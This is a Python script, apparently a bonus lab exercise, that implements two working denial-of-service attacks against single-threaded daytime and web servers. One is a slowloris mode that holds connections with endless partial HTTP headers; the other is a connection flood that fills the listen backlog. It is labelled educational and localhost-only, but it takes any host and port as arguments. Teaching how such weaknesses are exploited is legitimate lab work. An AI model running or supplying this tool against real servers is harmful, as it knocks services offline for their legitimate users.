#!/usr/bin/env python3
# crash_test.py - BONUS: take down the provided daytime / web server (localhost only)
#
# The web_server and daytime_server in this lab serve ONE client at a time
# (single thread, no concurrency). That is the weakness we attack here.
#
# Two attacks:
#   slowloris  -> hold the web server hostage with ONE slow connection.
#                 We send a partial HTTP request and then dribble one byte
#                 every few seconds. read_head() keeps waiting (wait_readable
#                 resets its 5s timer on every byte), so the server stays stuck
#                 on us and can serve nobody else. Classic Denial of Service.
#   flood      -> open many connections fast to exhaust the listen() backlog
#                 so new/real clients get "connection refused".
#
# USAGE (run the target server first, then):
#   python crash_test.py slowloris 127.0.0.1 8080
#   python crash_test.py flood     127.0.0.1 1313 --count 500
#
# EDUCATIONAL USE ONLY. Run it only against your own server on your own machine.

import socket
import sys
import time
import argparse


def slowloris(host, port, conns, delay):
    """Hold the single-threaded web server with slow partial requests."""
    sockets = []
    for i in range(conns):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        try:
            s.connect((host, port))
            # Send the request line but NOT the final blank line.
            # The server now waits for the rest of the head.
            s.sendall(b"GET / HTTP/1.0\r\n")
            sockets.append(s)
            print(f"[+] connection {i + 1}/{conns} opened and held")
        except OSError as e:
            print(f"[-] connection {i + 1} failed: {e}")

    print(f"\n[*] Holding {len(sockets)} connection(s). The server is now stuck.")
    print("[*] Try to open http://%s:%d/ in a browser - it will NOT load." % (host, port))
    print("[*] Press Ctrl+C to release.\n")

    try:
        while True:
            time.sleep(delay)
            for s in list(sockets):
                try:
                    # One more header byte - never completes the request,
                    # but resets the server's read timeout so it keeps waiting.
                    s.sendall(b"X-a: b\r\n")
                except OSError:
                    sockets.remove(s)
            print(f"[*] dribbled a byte on {len(sockets)} connection(s) (server still blocked)")
            if not sockets:
                print("[!] all connections dropped by server")
                break
    except KeyboardInterrupt:
        print("\n[*] releasing connections")
    finally:
        for s in sockets:
            s.close()


def flood(host, port, count):
    """Open many connections fast to overflow the accept backlog."""
    held = []
    refused = 0
    for i in range(count):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        try:
            s.connect((host, port))
            held.append(s)        # keep it open, do not read -> fills the queue
        except OSError:
            refused += 1
        if (i + 1) % 50 == 0:
            print(f"[*] tried {i + 1}, held {len(held)}, refused {refused}")
    print(f"\n[*] done: {len(held)} held open, {refused} refused.")
    print("[*] While this runs, real clients get 'connection refused' or time out.")
    print("[*] Press Ctrl+C to release.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        for s in held:
            s.close()


def main():
    p = argparse.ArgumentParser(description="DoS test for the lab's single-threaded servers (localhost only).")
    p.add_argument("mode", choices=["slowloris", "flood"])
    p.add_argument("host", nargs="?", default="127.0.0.1")
    p.add_argument("port", nargs="?", type=int, default=8080)
    p.add_argument("--conns", type=int, default=1, help="slowloris: how many slow connections")
    p.add_argument("--delay", type=float, default=3.0, help="slowloris: seconds between dribbles (<5)")
    p.add_argument("--count", type=int, default=500, help="flood: how many connections to open")
    a = p.parse_args()

    print(f"[*] target {a.host}:{a.port}  mode={a.mode}\n")
    if a.mode == "slowloris":
        slowloris(a.host, a.port, a.conns, a.delay)
    else:
        flood(a.host, a.port, a.count)


if __name__ == "__main__":
    main()
